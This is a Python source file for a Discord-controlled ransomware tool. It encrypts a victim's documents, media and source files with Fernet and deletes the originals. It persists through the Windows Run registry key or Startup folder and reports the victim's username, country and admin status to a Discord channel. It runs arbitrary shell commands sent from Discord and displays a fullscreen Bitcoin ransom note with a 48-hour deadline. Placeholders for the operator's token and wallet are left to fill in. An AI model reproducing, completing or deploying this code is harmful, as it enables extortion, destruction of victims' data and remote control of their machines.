#
# 
#      MADE BY COOKIESKUSH420#3617
#  if your reading this hello there <3
#
#
import discord , asyncio , ctypes , os , base64 , string , random , webbrowser
from cryptography.fernet import Fernet as f
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from discord_components import *
from discord.ext import commands
from tkinter import *
import tkinter as tk
import shutil
import winreg
import sys
import ssl
from ctypes import *
import asyncio
import discord
token = 'DISCORD_TOKEN_HERE'
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Availaible commands are :

--> !enc = Encrypt users DIR of your choice / Syntax = "!enc USERS_DIR_HERE"

--> !dec = Decrypt users DIR with genned key / Syntax = "!dec @2Dds0#HA)y&(sXKM@L(SMo^KAsP USERS_DIR_HERE"

--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"

--> !shell = Execute a shell command / Syntax  = "!shell DIR /r"

--> !sendbox = Send scary message box to user once your done encrypting all the folders u wish!

--> !wallpaper = Change infected computer wallpaper to message box as u send it if you wish / Syntax = "!wallpaper" (with attachment)

--> !help = View this command!

"""



async def activity(client):
    import time
    while True:
        global stop_threads
        if stop_threads: # idek why this shit is here it pisses me the FUCK off
            break
        window_displayer = discord.Game(f"!help | DEV ~ CookiesKush420#3617")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)


def password(passwd):
    
    password = passwd.encode() # Convert to type bytes
    salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
    kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
            )
    k = base64.urlsafe_b64encode(kdf.derive(password))
    return k



def enc_fun(key,file):
    try:
        with open(file,"rb") as fname:
            data = fname.read()
        fl,ext = os.path.splitext(file)
        fkey = f(key)
        enc = fkey.encrypt(data)
        with open(str(fl[0:])+ext+'.PAYUPBITCH','wb') as encfile:
            encfile.write(enc)
        os.remove(file)
    except:
        pass


def dec_fun(key,file):
    try:        
        with open(file, "rb") as fname:
            data = fname.read()
        fkey = f(key)
        fl,ext = os.path.splitext(file)
        dec = fkey.decrypt(data)
        with open(str(fl[0:]), 'wb') as decfile:
            decfile.write(dec)
        os.remove(file)
    
    except:
        pass


def spam_messagebox():

    root= tk.Tk()
    width = root.winfo_screenwidth() # Get screen width
    height = root.winfo_screenheight() # Get screen height


    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*6, window=label1)


    label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*7, window=label1)


    label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') # Subtitle
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='If you do not pay within 5 days, your files will be deleted forever') # Subtitle
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)


    label1 = tk.Label(root, text='to decrypt them, send 150$ in BITCOIN to') # Blackmail ammount
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*11, window=label1)


    label1 = tk.Label(root, text='YOUR_BTC_ADDRESS_HERE') # Change this to your BTC address
    label1.config(font=('helvetica', int(height/50))) # Size
    label1.config(background='black', foreground='red') # Colors
    canvas1.create_window(int(width/2), int(height/20)*13, window=label1)
                                                # *13 means how far down the canvas the subtitle is!

    label1 = tk.Label(root, text='and then send proof of transfer to YOUR_NAME_HERE on Discord to get your files decrypted') # Change YOUR_NAME_HERE to your contact name
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*15, window=label1)

    def How_To_BTC():
        webbrowser.open('https://blog.hubspot.com/marketing/how-to-get-bitcoins#:~:text=There%20are%20four%20main%20ways,in%20exchange%20for%20completing%20tasks.')


    button1 = tk.Button(text='How to buy BITCOIN?', command=How_To_BTC)
    button1.config(background='blue')
    canvas1.create_window(int(width/2), int(height/20)*17, window=button1)



    
    root.attributes('-fullscreen', True) # Set fullscreen || SET TO TRUE
    root.mainloop()



def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if "session" in total[y]:
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    #value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
    value1 = f"@everyone ✅ **{channel_name}** | {platform.system()} {platform.release()} | :flag_{flag.lower()}: \n> Some dumbass named **`{os.getlogin()}`** ran Cookies Ransomware PLUS tool start blackmailing them!"
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"!help | DEV ~ CookiesKush420#3617")
    await client.change_presence(status=discord.Status.online, activity=game)


@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)

        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"{message.content[6:]} killed.")
            except:
                await message.channel.send(f"{message.content[6:]} is invalid, please enter a valid session name")


        if message.content.startswith("!enc"):
    
            reg_name = "System"
            userdir = message.content[5:]
    
            try:
                import os
                key1 = winreg.HKEY_CURRENT_USER
                key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
    
                winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
                open_.Close()
                await message.channel.send("Successfully added Ransomware PLUS tool to `run` startup")
            except PermissionError:
                shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
                await message.channel.send("Permission was denied, added Ransomware to `startup folder` instead")
    
            await message.channel.send(f"Succesfully encrypting users files, Please wait for the DIR ```{userdir}``` to encrypt and the bot will send the key here needed to decrypt the DIR! **DONT LOOSE IT**")
    
            listOfFiles = list()
    
            file_input = userdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    characters = list(string.ascii_letters + string.digits + "!@#$%^&()!@#$%^&()!@#$%^&()")
                    length = 30
                    
                    passwd = ''
                    for c in range(length):
                        passwd += random.choice(characters)
    
                    start = time.time()
                    if os.path.isfile(file_input)==False:
                        for (dirpath, dirnames, filenames) in os.walk(file_input):
                            EXCLUDE_DIRECTORY = (
                                #Mac/Linux system directory
                                '/usr',  
                                '/Library/',
                                '/System',
                                '/Applications',
                                '.Trash',
                                #Windows system directory
                                'Program Files',
                                'Program Files (x86)',
                                'Windows',
                                '$Recycle.Bin',
                                'AppData',
                                'logs',
                            )
                            if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                pass
                            else:
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                for l in listOfFiles:
                                    EXTENSIONS = (
                                        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
                                        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
                                        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
                                        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
                                
                                        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
                                        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
                                        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
                                        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
                                        
                                        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
                                        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
                                        '.java', '.class', '.jar', # java source code
                                        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
                                        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
                                        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
                                
                                        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                                    )
                                    if l.endswith(EXTENSIONS):
                                        import threading
                                        x= threading.Thread(target=enc_fun,args=(password(passwd),l))
                                        x.start()
                                        x.join()
                    else:
                        enc_fun(password(passwd),file_input)
    
                    await message.channel.send(f"Key to decrypt DIR: ```{passwd}```")
                else:
                    await message.channel.send(f"Please enter a DIR!")
            else:
                await message.channel.send(f"DIR does not exist!")



        if message.content.startswith("!dec"):

            await message.channel.send(f"Starting to decrypt users DIR")

            import os
            
            listOfFiles = list()

            genned_key = message.content[5:35]
            usersdir = message.content[36:]

            file_input = usersdir
            if os.path.exists(file_input):
                if file_input !="":
                    import time
                    passwd = genned_key
                    start = time.time()
                    if os.path.isfile(file_input)==False:
                            for (dirpath, dirnames, filenames) in os.walk(file_input):
                                EXCLUDE_DIRECTORY = (
                                    #Mac/Linux system directory
                                    '/usr',  
                                    '/Library/',
                                    '/System',
                                    '/Applications',
                                    '.Trash',
                                    #Windows system directory
                                    'Program Files',
                                    'Program Files (x86)',
                                    'Windows',
                                    '$Recycle.Bin',
                                    'AppData',
                                    'logs',
                                )
                                if any(s in dirpath for s in EXCLUDE_DIRECTORY):
                                    pass
                                else:
                                    listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                    for l in listOfFiles:
                                        EXTENSIONSS = (
                                            '.PAYUPBITCH',
                                        )
                                        if l.endswith(EXTENSIONSS):
                                            import threading
                                            x = threading.Thread(target=dec_fun,args=(password(passwd),l))
                                            x.start()
                                            x.join()
                                        else:
                                            pass
                    else:
                        dec_fun(password(passwd),file_input)                
                    await message.channel.send(f"Decrypted user DIR ```{usersdir}```")
                else:                             
                    await message.channel.send(f"**Please enter a DIR!**")
            else:           
                await message.channel.send(f"DIR does not exist! ```{usersdir}```")


        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("Command successfully executed")


        if message.content == "!sendbox":
                    await message.channel.send("Sent message to user! ```If victim does not pay within 48 hours double the price!```")
                    spam_messagebox()


        if message.content == "!help":

            await message.channel.send("https://pastebin.com/GaJbwS3Y **Key for pastebin is** ```3xcst-ZbtU$AMMz8rW}bDk3&e```")

            # import os
            # temp = (os.getenv('TEMP'))
            # f5 = open(temp + r"\helpmenu.txt", 'a')
            # f5.write(str(helpmenu))
            # f5.close()
            # temp = (os.getenv('TEMP'))
            # file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
            # await message.channel.send("Command successfully executed", file=file)
            # os.system(r"del %temp%\helpmenu.txt /f")



        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("Unrecognized command or no output was obtained :(")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("Command successfully executed", file=file)
                    dele = "del" + temp + r"\output.txt"
                    os.popen(dele)
                else:
                    await message.channel.send(f"Command successfully executed : ```{result}``` ")
            else:
                await message.channel.send("Unrecognized command or no output was obtained :(")
                status = None


            
client.run(token)
